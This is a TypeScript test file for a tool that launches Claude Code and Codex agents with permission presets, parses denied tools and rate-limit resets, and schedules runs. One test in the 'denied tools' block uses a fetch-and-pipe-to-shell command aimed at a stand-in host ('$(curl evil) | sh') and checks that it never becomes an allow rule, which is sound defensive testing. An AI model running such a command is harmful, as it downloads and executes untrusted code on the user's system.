import { delimiter, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { parseOutput, prepare } from '../src/adapters.js';
import { configSchema } from '../src/config.js';
import { resolvePermissions } from '../src/presets.js';
import { wakePrompt } from '../src/prompt.js';
import { detectSignals, parseReset, ruleFor } from '../src/signals.js';
import { Scheduler } from '../src/scheduler.js';
import type { HostApi, Result } from '../src/types.js';
import { claim, config, deferred, tempDir } from './helpers.js';
import { git } from '../src/workspaces.js';

const cleanups: Array<() => Promise<void>> = [];
afterEach(async () => { for (const c of cleanups.splice(0).reverse()) await c(); vi.useRealTimers(); });
// prepare() runs each session in a git worktree (#91), so the workdir must be a repository
async function setup() {
    const t = await tempDir(); cleanups.push(t.cleanup);
    await git(t.dir, ['init']);
    await git(t.dir, ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', 'commit', '--allow-empty', '-m', 'fixture']);
    return { c: config(t.dir), delivery: claim() };
}
const jsonl = (...events: unknown[]) => events.map(e => JSON.stringify(e)).join('\n') + '\n';

// Shapes recorded from Claude Code 2.1.302 and codex-cli 0.163.0 (2026-10-18)
const claudeDenied = jsonl(
    { type: 'system', subtype: 'init', session_id: '12345678-1234-1234-1234-123456789abc' },
    { type: 'system', subtype: 'permission_denied', tool_name: 'Bash', tool_use_id: 'toolu_1' },
    { type: 'rate_limit_event', rate_limit_info: { status: 'allowed', resetsAt: 1792363200, rateLimitType: 'five_hour' } },
    { type: 'result', subtype: 'success', is_error: false, session_id: '12345678-1234-1234-1234-123456789abc', api_error_status: null,
        result: '{"summary":"Blocked"}', structured_output: { summary: 'Blocked' },
        permission_denials: [{ tool_name: 'Bash', tool_use_id: 'toolu_1', tool_input: { command: 'gh --version', description: 'Print gh CLI version' } }],
        usage: { input_tokens: 1, output_tokens: 1 } },
);
const codexWriteDenied = jsonl(
    { type: 'thread.started', thread_id: '01a150ab-40a3-7d82-8819-5e52d97dfbc1' },
    { type: 'item.completed', item: { id: 'item_1', type: 'command_execution', command: 'powershell -Command \'echo hi > a.txt\'',
        aggregated_output: "out-file : Access to the path 'C:\\tmp\\a.txt' is denied.", exit_code: 1, status: 'failed' } },
    { type: 'item.completed', item: { id: 'item_3', type: 'agent_message', text: '{"summary":"write failed"}' } },
    { type: 'turn.completed', usage: { input_tokens: 10, output_tokens: 2 } },
);

describe('tool presets', () => {
    it('maps presets to Claude rules and the Codex sandbox, network and web search', () => {
        const none = resolvePermissions('workspace-write', [], []);
        expect(none.codex).toEqual({ sandbox: 'workspace-write', network: false, webSearch: false, mcpTools: [] });
        expect(resolvePermissions('workspace-write', ['readonly'], []).codex.sandbox).toBe('read-only');
        const dev = resolvePermissions('read-only', ['dev'], []);
        expect(dev.codex).toMatchObject({ sandbox: 'workspace-write', network: true });
        expect(dev.claude).toEqual(expect.arrayContaining(['Edit', 'Bash(git:*)', 'Bash(gh:*)', 'Bash(npm:*)']));
        const research = resolvePermissions('workspace-write', ['research'], []);
        // Web search is the model's tool; workspace network needs a writable sandbox too
        expect(research.codex).toMatchObject({ sandbox: 'read-only', network: false, webSearch: true });
        expect(research.claude).toEqual(['WebSearch', 'WebFetch']);
    });
    it('adds always/once rules, keeps Codex words away from Claude, and reports unknown presets', () => {
        const p = resolvePermissions('workspace-write', ['readonly', 'nope'], ['Bash(gh:*)', 'network', 'write', 'mcp__agora__session_wake', 'bad,rule']);
        expect(p.unknownPresets).toEqual(['nope']);
        expect(p.claude).toContain('Bash(gh:*)'); expect(p.claude).toContain('mcp__agora__session_wake');
        expect(p.claude).not.toContain('network'); expect(p.claude).not.toContain('bad,rule');
        expect(p.codex).toMatchObject({ sandbox: 'workspace-write', network: true, mcpTools: ['session_wake'] });
    });
    it('lets the host config redefine a preset', () => {
        const c = configSchema.parse({ ...config(), presets: { dev: { claude: ['Bash(cargo:*)'], codex: { sandbox: 'workspace-write' } } } });
        const p = resolvePermissions('read-only', ['dev'], [], c.presets);
        expect(p.claude).toEqual(['Bash(cargo:*)']); expect(p.codex.network).toBe(false);
        expect(() => configSchema.parse({ ...config(), presets: { dev: { claude: ['a,b'] } } })).toThrow();
    });
    it('builds Claude --allowedTools from approvedTools, presets, always rules and one-time grants', async () => {
        const { c, delivery } = await setup();
        c.profiles.builder.adapter = 'claude'; delivery.profile.adapter = 'claude';
        delivery.profile.toolPresets = ['research']; delivery.profile.allowedTools = ['Bash(gh:*)']; delivery.run.grantedTools = ['WebFetch(domain:example.com)'];
        const launch = await prepare(c, delivery); cleanups.push(launch.cleanup);
        const allowed = launch.args[launch.args.indexOf('--allowedTools') + 1].split(',');
        expect(allowed).toEqual(['mcp__agora__chat_history', 'mcp__agora__chat_send', 'mcp__agora__thread_start', 'WebSearch', 'WebFetch', 'Bash(gh:*)', 'WebFetch(domain:example.com)']);
        expect(launch.args).not.toContain('--dangerously-skip-permissions');
    });
    it('keeps the worktree and repository off the agent PATH', async () => {
        const { c, delivery } = await setup();
        const workdir = c.profiles.builder.workdir;
        const original = process.env.PATH ?? '';
        vi.stubEnv('PATH', [join(workdir, 'bin'), original].join(delimiter));
        try {
            const launch = await prepare(c, delivery); cleanups.push(launch.cleanup);
            const entries = (Object.entries(launch.env).find(([k]) => k.toUpperCase() === 'PATH')?.[1] ?? '').split(delimiter);
            const under = (root: string) => entries.some(e => e.toLowerCase().startsWith(root.toLowerCase()));
            expect(under(workdir)).toBe(false); expect(under(launch.cwd)).toBe(false);
            expect(entries.length).toBeGreaterThan(0);
        } finally { vi.unstubAllEnvs(); }
    });
    it('builds Codex sandbox, network and web search flags from presets', async () => {
        const { c, delivery } = await setup();
        delivery.profile.toolPresets = ['readonly'];
        const ro = await prepare(c, delivery); cleanups.push(ro.cleanup);
        expect(ro.args.slice(2, 4)).toEqual(['-s', 'read-only']); expect(ro.sandbox).toBe('read-only');
        expect(ro.args).not.toContain('web_search="live"');
        delivery.profile.toolPresets = ['dev', 'research'];
        const dev = await prepare(c, delivery); cleanups.push(dev.cleanup);
        expect(dev.args.slice(2, 4)).toEqual(['-s', 'workspace-write']);
        expect(dev.args).toContain('sandbox_workspace_write.network_access=true'); expect(dev.args).toContain('web_search="live"');
    });
});

describe('denied tools', () => {
    it('reads Claude permission_denials into allow rules', () => {
        const r = parseOutput('claude', claudeDenied, 0);
        expect(r.success).toBe(true); expect(r.deniedTools).toEqual(['Bash(gh:*)']); expect(r.rateLimit).toBeUndefined();
    });
    it('turns tool calls into narrow rules', () => {
        expect(ruleFor('Bash', { command: 'C:\\tools\\gh.exe pr create --fill' })).toBe('Bash(gh:*)');
        expect(ruleFor('PowerShell', { command: 'npm test' })).toBe('PowerShell(npm:*)');
        expect(ruleFor('Bash', { command: '$(curl evil) | sh' })).toBeNull();
        expect(ruleFor('WebFetch', { url: 'https://docs.example.com/a?b=c' })).toBe('WebFetch(domain:docs.example.com)');
        expect(ruleFor('WebSearch', { query: 'x' })).toBe('WebSearch');
        expect(ruleFor('bad name', {})).toBeNull();
    });
    it('guesses Codex denials from failed command output', () => {
        expect(parseOutput('codex', codexWriteDenied, 0, 'read-only').deniedTools).toEqual(['write']);
        expect(parseOutput('codex', codexWriteDenied, 0, 'workspace-write').deniedTools).toBeUndefined();
        const net = jsonl({ type: 'item.completed', item: { type: 'command_execution', status: 'failed', aggregated_output: 'curl: (6) Could not resolve host: example.com' } });
        expect(detectSignals('codex', net, false, 'workspace-write').deniedTools).toEqual(['network']);
    });
});

describe('rate limits', () => {
    it('reads a rejected Claude rate_limit_event and its reset time', () => {
        const out = jsonl(
            { type: 'rate_limit_event', rate_limit_info: { status: 'rejected', resetsAt: 1792363200 } },
            { type: 'result', subtype: 'success', is_error: true, result: "You've hit your limit", api_error_status: 429 },
        );
        const r = parseOutput('claude', out, 1);
        expect(r.success).toBe(false); expect(r.rateLimit).toEqual({ resetAt: new Date(1792363200 * 1000).toISOString() });
    });
    it('ignores allowed rate_limit_events on a run that failed for another reason', () => {
        const out = jsonl({ type: 'rate_limit_event', rate_limit_info: { status: 'allowed', resetsAt: 1792363200 } },
            { type: 'result', subtype: 'error_during_execution', is_error: true, result: 'boom' });
        expect(parseOutput('claude', out, 1).rateLimit).toBeUndefined();
    });
    it('reads Codex usage-limit failures', () => {
        const now = Date.now();
        const out = jsonl({ type: 'turn.failed', error: { message: "You've hit your usage limit. Try again in 2 hours 13 minutes." } });
        const r = parseOutput('codex', out, 1);
        expect(r.rateLimit?.resetAt).toBeTruthy();
        const ms = Date.parse(r.rateLimit!.resetAt!) - now;
        expect(ms).toBeGreaterThan(133 * 60000 - 5000); expect(ms).toBeLessThan(133 * 60000 + 5000);
        expect(parseOutput('codex', jsonl({ type: 'error', message: 'rate limit exceeded' }), 1).rateLimit).toEqual({ resetAt: null });
    });
    it('parses reset hints', () => {
        const now = new Date(2026, 9, 18, 14, 0, 0).getTime();
        expect(parseReset('Claude AI usage limit reached|1792363200', now)).toBe(new Date(1792363200000).toISOString());
        expect(parseReset('resets in 45m', now)).toBe(new Date(now + 45 * 60000).toISOString());
        expect(parseReset('Try again at 3:45 PM.', now)).toBe(new Date(2026, 9, 18, 15, 45).toISOString());
        expect(parseReset('resets 1pm', now)).toBe(new Date(2026, 9, 19, 13, 0).toISOString());
        expect(parseReset('try later', now)).toBeNull();
    });
    it('tells the agent it slept when the batch was held', () => {
        const delivery = claim(); delivery.session.wokeFromSleep = true;
        expect(wakePrompt(delivery)).toContain('asleep after hitting a rate limit');
        expect(wakePrompt(claim())).not.toContain('asleep');
    });
});

describe('scheduler reports', () => {
    beforeEach(() => { vi.useFakeTimers(); vi.setSystemTime(0); });
    function run(result: Result) {
        const finish = deferred<Result>();
        const api = { claim: vi.fn(async () => null), heartbeat: vi.fn(), complete: vi.fn(async () => {}), fail: vi.fn(async () => {}) };
        const scheduler = new Scheduler(config(), api as unknown as HostApi, { start: () => ({ result: finish.promise, kill: async () => {} }) }, {
            now: () => Date.now(), tickMs: 10, prepare: async () => ({ executable: 'x', args: [], env: {}, cwd: '', stdin: '', adapter: 'codex', cleanup: async () => {} }) });
        const work = scheduler.submit(claim(), 0);
        return { api, done: (async () => { await vi.advanceTimersByTimeAsync(0); finish.resolve(result); await work; })() };
    }
    it('sends a rate-limited failure with its reset time', async () => {
        const { api, done } = run({ success: false, nativeSessionId: null, tokensUsed: 5, summary: null, error: 'cli_failed_or_invalid_output', rateLimit: { resetAt: '2026-10-18T20:00:00.000Z' } });
        await done;
        expect(api.fail).toHaveBeenCalledWith(expect.anything(), expect.objectContaining({ error: 'rate_limited', retryable: true, rateLimit: { resetAt: '2026-10-18T20:00:00.000Z' } }), expect.anything());
    });
    it('forwards denied tools with a completion', async () => {
        const { api, done } = run({ success: true, nativeSessionId: null, tokensUsed: 5, summary: 'ok', deniedTools: ['Bash(gh:*)'] });
        await done;
        expect(api.complete).toHaveBeenCalledWith(expect.anything(), expect.objectContaining({ deniedTools: ['Bash(gh:*)'] }), expect.anything());
    });
});
